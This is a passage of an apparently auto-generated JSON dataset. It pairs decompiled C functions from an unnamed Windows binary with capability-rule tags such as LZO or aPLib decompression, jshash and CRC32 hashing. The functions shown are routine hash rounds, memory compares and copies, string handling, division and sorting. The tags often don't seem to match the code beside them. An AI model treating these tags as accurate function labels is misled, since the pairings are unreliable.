uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[6] + *0x493898 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[0xd] + *0x49389c + ((~uVar4 | uVar2) ^ uVar3);\n    uVar1 = (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    uVar4 = uVar4 + param_2[4] + *0x4938a0 + ((~uVar3 | uVar1) ^ uVar2);\n    uVar4 = (uVar4 * 0x40 | uVar4 >> 0x1a) + uVar1;\n    uVar3 = uVar3 + param_2[0xb] + *0x4938a4 + ((~uVar2 | uVar4) ^ uVar1);\n    uVar3 = (uVar3 * 0x400 | uVar3 >> 0x16) + uVar4;\n    uVar2 = uVar2 + param_2[2] + *0x4938a8 + ((~uVar1 | uVar3) ^ uVar4);\n    uVar2 = (uVar2 * 0x8000 | uVar2 >> 0x11) + uVar3;\n    uVar1 = uVar1 + param_2[9] + *0x4938ac + ((~uVar4 | uVar2) ^ uVar3);\n    *in_EAX = *in_EAX + uVar4;\n    in_EAX[1] = in_EAX[1] + (uVar1 * 0x200000 | uVar1 >> 0xb) + uVar2;\n    in_EAX[2] = in_EAX[2] + uVar2;\n    in_EAX[3] = in_EAX[3] + uVar3;\n    return;\n}\n",
        "token_count": 4557
    },
    "004039c8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004039c8(uint param_1, uint8_t *param_2)\n\n{\n    uint8_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    \n    uVar2 = *param_2;\n    piVar4 = in_EAX + 1;\n    piVar5 = param_2 + 1;\n    iVar1 = *in_EAX - uVar2;\n    if (*in_EAX < uVar2 || iVar1 == 0) {\n        uVar2 = uVar2 + iVar1;\n    }\n    uVar3 = uVar2 >> 2;\n    do {\n        if (uVar3 == 0) {\ncode_r0x00403a0b:\n            uVar3 = uVar2 & 3;\n            uVar2 = uVar3;\n            if ((uVar3 == 0) ||\n               ((*piVar4 == *piVar5 &&\n                ((uVar2 = uVar3 - 1,  uVar2 == 0 ||\n                 ((*(piVar4 + 1) == *(piVar5 + 1) &&\n                  ((uVar2 = uVar3 - 2,  uVar2 == 0 || (*(piVar4 + 2) == *(piVar5 + 2))))))))))) {\n                iVar1 = iVar1 * 2;\n            }\ncode_r0x00403a46:\n            return CONCAT44(uVar2, iVar1);\n        }\n        if (*piVar4 != *piVar5) goto code_r0x00403a46;\n        if (uVar3 == 1) {\n            piVar4 = piVar4 + 1;\n            piVar5 = piVar5 + 1;\n            goto code_r0x00403a0b;\n        }\n        if (piVar4[1] != piVar5[1]) goto code_r0x00403a46;\n        piVar4 = piVar4 + 2;\n        piVar5 = piVar5 + 2;\n        uVar3 = uVar3 - 2;\n    } while( true );\n}\n",
        "token_count": 490
    },
    "00403a4c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403a4c(uint32_t param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = param_1 >> 2;\n    do {\n        if (uVar1 == 0) {\ncode_r0x00403a7c:\n            param_1 = param_1 & 3;\n            if (((param_1 != 0) && (*in_EAX == *param_2)) &&\n               ((param_1 == 1 ||\n                ((*(in_EAX + 1) == *(param_2 + 1) && ((param_1 == 2 || (*(in_EAX + 2) == *(param_2 + 2))))))))) {\n                return NULL;\n            }\n            return in_EAX;\n        }\n        if (*in_EAX != *param_2) {\n            return in_EAX;\n        }\n        if (uVar1 == 1) {\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n            goto code_r0x00403a7c;\n        }\n        if (in_EAX[1] != param_2[1]) {\n            return in_EAX;\n        }\n        in_EAX = in_EAX + 2;\n        param_2 = param_2 + 2;\n        uVar1 = uVar1 - 2;\n    } while( true );\n}\n",
        "token_count": 328
    },
    "0040465c": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404691)\n// WARNING: Removing unreachable block (ram,0x00404697)\n// WARNING: Removing unreachable block (ram,0x0040469e)\n// WARNING: Removing unreachable block (ram,0x004046a4)\n// WARNING: Removing unreachable block (ram,0x004046aa)\n\nvoid __fastcall fcn.0040465c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    *param_2 = in_EAX;\n    uVar2 = *(in_EAX + -0x28);\n    uVar1 = uVar2 >> 2;\n    piVar3 = param_2 + 1;\n    while (uVar1 = uVar1 - 1,  uVar1 != 0) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    for (; *(in_EAX + -0x24) != NULL; in_EAX = **(in_EAX + -0x24)) {\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "00405ed4": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ed4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (((in_EAX != param_2) && (in_EAX != NULL)) && (param_2 != NULL)) {\n        uVar2 = param_2[-1];\n        iVar1 = in_EAX[-1] - uVar2;\n        if (in_EAX[-1] < uVar2 || iVar1 == 0) {\n            uVar2 = uVar2 + iVar1;\n        }\n        uVar2 = uVar2 >> 2;\n        for (; ((uVar2 != 0 && (*in_EAX == *param_2)) && ((uVar2 != 1 && (in_EAX[1] == param_2[1]))));\n            in_EAX = in_EAX + 2) {\n            param_2 = param_2 + 2;\n            uVar2 = uVar2 - 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0040a8fc": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a8fc(int32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    bool bVar4;\n    \n    bVar4 = param_1 == 0;\n    iVar1 = param_1;\n    puVar3 = param_2;\n    if (!bVar4) {\n        do {\n            if (iVar1 == 0) break;\n            iVar1 = iVar1 + -1;\n            bVar4 = *puVar3 == '\\0';\n            puVar3 = puVar3 + 1;\n        } while (!bVar4);\n        if (bVar4) {\n            iVar1 = iVar1 + 1;\n        }\n    }\n    for (uVar2 = param_1 - iVar1 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    for (uVar2 = param_1 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *in_EAX = *param_2;\n        param_2 = param_2 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    *in_EAX = 0;\n    return;\n}\n",
        "token_count": 337
    },
    "0041d004": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d004(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0x14) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0x14) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041d050();\n            uVar2 = *(in_EAX + 0x14);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *param_2 = *puVar4;\n            puVar4 = puVar4 + 1;\n            param_2 = param_2 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "0041f4b8": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f4b8(uint32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    while (param_1 != 0) {\n        uVar2 = *(in_EAX + 0xc) - *(in_EAX + 0x10);\n        if (*(in_EAX + 0xc) < *(in_EAX + 0x10) || uVar2 == 0) {\n            fcn.0041f504();\n            uVar2 = *(in_EAX + 0xc);\n        }\n        if (param_1 <= uVar2) {\n            uVar2 = param_1;\n        }\n        param_1 = param_1 - uVar2;\n        iVar1 = *(in_EAX + 0x10);\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + uVar2;\n        puVar4 = *(in_EAX + 8) + iVar1;\n        for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *param_2;\n            param_2 = param_2 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "004687d0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004687d0(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    char cStack16;\n    char cStack15;\n    \n    uStack36 = *(in_EAX + 0x78);\n    uVar2 = *(in_EAX + 0x74);\n    pcVar3 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    if (*(in_EAX + 0x28) - 0x106U < *(in_EAX + 0x68)) {\n        uVar6 = *(in_EAX + 0x68) - (*(in_EAX + 0x28) + -0x106);\n    }\n    else {\n        uVar6 = 0;\n    }\n    cStack16 = pcVar3[uVar2 - 1];\n    pcVar5 = *(in_EAX + 0x34) + *(in_EAX + 0x68);\n    cStack15 = pcVar3[uVar2];\n    if (*(in_EAX + 0x88) <= *(in_EAX + 0x74)) {\n        uStack36 = uStack36 >> 2;\n    }\n    uStack40 = param_2;\n    uStack32 = *(in_EAX + 0x8c);\n    if (*(in_EAX + 0x70) < *(in_EAX + 0x8c)) {\n        uStack32 = *(in_EAX + 0x70);\n    }\n    do {\n        pcVar8 = *(in_EAX + 0x34) + uStack40;\n        if ((((pcVar8[uVar2] == cStack15) && (pcVar8[uVar2 - 1] == cStack16)) && (*pcVar8 == *pcVar3)) &&\n           (pcVar8[1] == pcVar3[1])) {\n            pcVar8 = pcVar8 + 2;\n            pcVar3 = pcVar3 + 2;\n            while (((((pcVar4 = pcVar3 + 1,  *pcVar4 == pcVar8[1] && (pcVar4 = pcVar3 + 2,  *pcVar4 == pcVar8[2])) &&\n                     ((pcVar4 = pcVar3 + 3,  *pcVar4 == pcVar8[3] &&\n                      ((pcVar4 = pcVar3 + 4,  *pcVar4 == pcVar8[4] && (pcVar4 = pcVar3 + 5,  *pcVar4 == pcVar8[5]))))))\n                    && (pcVar4 = pcVar3 + 6,  *pcVar4 == pcVar8[6])) && (pcVar4 = pcVar3 + 7,  *pcVar4 == pcVar8[7]))) {\n                pcVar4 = pcVar3 + 8;\n                pcVar8 = pcVar8 + 8;\n                if ((*pcVar4 != *pcVar8) || (pcVar3 = pcVar4,  pcVar5 + 0x102 <= pcVar4)) break;\n            }\n            iVar1 = -((pcVar5 + 0x102) - pcVar4);\n            uVar7 = iVar1 + 0x102;\n            pcVar3 = pcVar5;\n            if (uVar2 < uVar7) {\n                *(in_EAX + 0x6c) = uStack40;\n                if (uStack32 <= uVar7) {\ncode_r0x0046892f:\n                    uVar2 = *(in_EAX + 0x70);\n                    if (uVar7 <= uVar2) {\n                        uVar2 = uVar7;\n                    }\n                    return uVar2;\n                }\n                cStack16 = pcVar5[iVar1 + 0x101];\n                cStack15 = pcVar5[uVar7];\n                uVar2 = uVar7;\n            }\n        }\n        uVar7 = uVar2;\n        uStack40 = *(*(in_EAX + 0x3c) + (uStack40 & *(in_EAX + 0x30)) * 2);\n        if ((uStack40 <= uVar6) || (uStack36 = uStack36 - 1,  uVar2 = uVar7,  uStack36 == 0)) goto code_r0x0046892f;\n    } while( true );\n}\n",
        "token_count": 1057
    },
    "00405758": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405758(uint param_1, int16_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    int16_t *piVar2;\n    \n    arg_8h = 0;\n    piVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar2 != 0; piVar2 = piVar2 + 4) {\n            if (piVar2[1] == 0) {\ncode_r0x00405781:\n                piVar2 = piVar2 + 1;\n                break;\n            }\n            if (piVar2[2] == 0) {\ncode_r0x0040577e:\n                piVar2 = piVar2 + 1;\n                goto code_r0x00405781;\n            }\n            if (piVar2[3] == 0) {\n                piVar2 = piVar2 + 1;\n                goto code_r0x0040577e;\n            }\n        }\n        arg_8h = piVar2 - param_2 >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "004057d4": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004057d4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    \n    arg_8h = 0;\n    if (param_2 != 0) {\n        arg_8h = *(param_2 + -4) >> 1;\n    }\n    if (arg_8h == 0) {\n        fcn.00405530(param_2);\n    }\n    else if ((arg_8h + 1 < 0x7ff) && (iVar1 = fcn.00405650(arg_8h),  -1 < iVar1)) {\n        fcn.00405620();\n    }\n    else {\n        fcn.00405c6c();\n        fcn.00405650(arg_8h);\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00405d64": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405d64(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != param_2) {\n        if ((param_2 == 0) || (*(param_2 + -4) >> 1 == 0)) {\n            iVar1 = *in_EAX;\n            if (iVar1 != 0) {\n                *in_EAX = 0;\n                sub.oleaut32.dll_SysFreeString(iVar1);\n            }\n            return;\n        }\n        iVar1 = sub.oleaut32.dll_SysReAllocStringLen();\n        if (iVar1 == 0) {\n            if (*0x496008 != NULL) {\n                (**0x496008)();\n            }\n            fcn.00402ff8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00405e6c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.00405e6c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    uVar3 = 0;\n    piVar4 = param_2;\n    if (param_2 != NULL) {\n        for (; *piVar4 != 0; piVar4 = piVar4 + 2) {\n            if (*(piVar4 + 2) == 0) {\ncode_r0x00405e95:\n                piVar4 = piVar4 + 2;\n                break;\n            }\n            if (*(piVar4 + 1) == 0) {\ncode_r0x00405e92:\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405e95;\n            }\n            if (*(piVar4 + 6) == 0) {\n                piVar4 = piVar4 + 2;\n                goto code_r0x00405e92;\n            }\n        }\n        uVar3 = piVar4 - param_2 >> 1;\n    }\n    if (uVar3 == 0) {\n        iVar2 = *in_EAX;\n        if (iVar2 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar2);\n        }\n        return;\n    }\n    iVar2 = sub.oleaut32.dll_SysAllocStringLen(param_2, uVar3);\n    if (iVar2 != 0) {\n        iVar1 = *param_2;\n        *param_2 = iVar2;\n        sub.oleaut32.dll_SysFreeString(iVar1);\n        return;\n    }\n    if (*0x496008 != NULL) {\n        (**0x496008)();\n    }\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 447
    },
    "00405ec8": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.00405ec8(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "004064c0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004064c0(uint param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    \n    uVar8 = param_2 >> 0x1f;\n    uVar3 = (in_EAX ^ uVar8) - uVar8;\n    uVar6 = ((param_2 ^ uVar8) - uVar8) - ((in_EAX ^ uVar8) < uVar8);\n    uVar8 = param_4 >> 0x1f;\n    uVar9 = (param_2 ^ param_4) >> 0x1f;\n    uVar7 = (param_3 ^ uVar8) - uVar8;\n    uVar8 = ((param_4 ^ uVar8) - uVar8) - ((param_3 ^ uVar8) < uVar8);\n    if (uVar8 == 0) {\n        if (uVar7 <= uVar6) {\n            uVar8 = uVar6 / uVar7;\n            uVar6 = uVar6 % uVar7;\n        }\n        uVar3 = CONCAT44(uVar6, uVar3) / uVar7;\n    }\n    else {\n        bVar10 = (uVar8 & 1) != 0;\n        iVar4 = 0x1f;\n        if (uVar8 != 0) {\n            for (; uVar8 >> iVar4 == 0; iVar4 = iVar4 + -1) {\n            }\n        }\n        uVar5 = iVar4;\n        uVar1 = CONCAT44((uVar6 >> 1) >> (uVar5 & 0x1f), \n                         (uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f) >> (uVar5 & 0x1f) |\n                         (uVar6 >> 1) << 0x20 - (uVar5 & 0x1f)) /\n                ((uVar7 >> 1 | bVar10 << 0x1f) >> (uVar5 & 0x1f) |\n                (uVar8 >> 1 | bVar10 << 0x1f) << 0x20 - (uVar5 & 0x1f));\n        iVar4 = uVar1;\n        iVar2 = (uVar1 & 0xffffffff) * uVar7;\n        uVar8 = (iVar2 >> 0x20) + (uVar8 & 0xfffffffe | bVar10) * iVar4;\n        uVar3 = iVar4 - (uVar6 < uVar8 || uVar6 - uVar8 < (uVar3 < iVar2));\n        uVar8 = 0;\n    }\n    return CONCAT44(((uVar8 ^ uVar9) - uVar9) - ((uVar3 ^ uVar9) < uVar9), (uVar3 ^ uVar9) - uVar9);\n}\n",
        "token_count": 743
    },
    "0041b55c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b55c(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.0041b264();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041b55c(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 399
    },
    "0040be10": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be10(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 126
    },
    "0041d268": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d268(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.004205b0();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.00420584();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.0040676c();\n                fcn.00406928(iVar2 + 1);\n                uVar3 = fcn.00420584();\n                iVar2 = fcn.0040676c();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0041ebc8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ebc8(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cbe8();\n        if (cVar1 != '\\0') break;\n        fcn.0041ec7c();\n    }\n    fcn.0041dca4();\n    return;\n}\n",
        "token_count": 84
    },
    "0041ec20": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ec20(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cbe8();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cfe0();\n        if (cVar1 - 2U < 3) {\n            fcn.0041ec7c();\n        }\n        fcn.0041f088();\n        while( true ) {\n            cVar1 = fcn.0041cbe8();\n            if (cVar1 != '\\0') break;\n            fcn.0041ee2c();\n        }\n        fcn.0041dca4();\n    }\n    fcn.0041dca4();\n    return;\n}\n",
        "token_count": 177
    },
    "0042c74c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.0042c74c(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t *var_1ch_2;\n    uchar *var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch_2;\n    uint var_8h_3;\n    \n    iVar8 = 0;\n    iVar5 = (param_1 + 1) * -4;\n    var_10h = &stack0xffffffd4 + iVar5;\n    puVar2 = &stack0xffffffd4 + iVar5;\n    var_1ch_2 = in_EAX;\n    var_ch_2 = param_1;\n    do {\n        puVar6 = puVar2;\n        *(puVar6 + -4) = 0x42c77b;\n        iVar3 = fcn.0040a870();\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = iVar3;\n        *(puVar6 + -0x10) = param_2;\n        *(puVar6 + -0x14) = 0;\n        *(puVar6 + -0x18) = 0;\n        *(puVar6 + -0x1c) = 0x42c78c;\n        var_14h = sub.kernel32.dll_MultiByteToWideChar_1();\n        var_14h = var_14h + 1;\n        iVar5 = -(var_14h * 2 + 3U & 0xfffffffc);\n        var_18h = puVar6 + iVar5 + -0x18;\n        if (iVar8 == 0) {\n            *var_10h = puVar6 + iVar5 + -0x18;\n        }\n        else {\n            *(var_10h + (var_ch_2 - iVar8) * 4) = puVar6 + iVar5 + -0x18;\n            var_18h = puVar6 + iVar5 + -0x18;\n        }\n        *(puVar6 + iVar5 + -0x1c) = var_14h;\n        *(puVar6 + iVar5 + -0x20) = var_18h;\n        *(puVar6 + iVar5 + -0x24) = iVar3;\n        *(puVar6 + iVar5 + -0x28) = param_2;\n        *(puVar6 + iVar5 + -0x2c) = 0;\n        *(puVar6 + iVar5 + -0x30) = 0;\n        *(puVar6 + iVar5 + -0x34) = 0x42c7d1;\n        sub.kernel32.dll_MultiByteToWideChar_1();\n        *(var_18h + var_14h * 2 + -2) = 0;\n        param_2 = param_2 + iVar3 + 1;\n        iVar8 = iVar8 + 1;\n        puVar2 = puVar6 + iVar5 + -0x30;\n    } while (iVar8 != var_ch_2);\n    *(puVar6 + iVar5 + -0x34) = var_8h_2;\n    *(puVar6 + iVar5 + -0x38) = 0x42c7f0;\n    uVar4 = sub.kernel32.dll_GetThreadLocale_1();\n    *(puVar6 + iVar5 + -0x38) = uVar4;\n    *(puVar6 + iVar5 + -0x3c) = var_ch_2;\n    *(puVar6 + iVar5 + -0x40) = var_10h;\n    *(puVar6 + iVar5 + -0x44) = *0x495a0c;\n    *(puVar6 + iVar5 + -0x48) = var_1ch_2;\n    pcVar1 = *(*var_1ch_2 + 0x14);\n    puVar7 = puVar6 + iVar5 + -0x4c;\n    *(puVar6 + iVar5 + -0x4c) = 0x42c808;\n    iVar5 = (*pcVar1)();\n    if (iVar5 == -0x7ffdfffa) {\n        *(puVar7 + -4) = &stack0xfffffffc;\n        *(puVar7 + -8) = 0x42c815;\n        fcn.0042c718(*(puVar7 + -4));\n    }\n    else {\n        *(puVar7 + -4) = 0x42c81d;\n        fcn.0042bd2c();\n    }\n    return;\n}\n",
        "token_count": 1150
    },
    "00436ef4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00436ef4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040e8d4();\n    if (iVar1 != 0) {\n        fcn.00405a84();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 91
    },
    "0043ca10": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ca10(uint param_1, int32_t param_2)\n\n{\n    fcn.004547a4();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 65
    },
    "00452cbc": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
